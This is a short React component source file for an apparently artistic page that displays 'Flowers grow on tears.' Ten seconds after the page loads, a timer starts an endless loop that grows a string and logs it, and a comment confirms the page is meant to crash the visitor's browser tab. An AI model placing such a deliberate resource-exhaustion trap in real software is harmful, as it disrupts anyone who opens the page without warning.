import { useEffect } from "react"

export default function Tears() {
    useEffect(() => {
        document.title = "Round and round and round and round and round and round and round and round and round and round and";
        const timer = setTimeout(() => {
            let a = "";
            while (true){
                a = a += "koharu";
                console.log(a);
            }
           // window.alert("This is when it will crash...");
        }, 10000);
    })

    return (
        <div className = "w-screen h-screen content-center">
            <p className = "select-none transition delay-500 duration-500 text-white hover:text-gray-300 text-center">
                Flowers grow on tears.
            </p>
        </div>
    )
}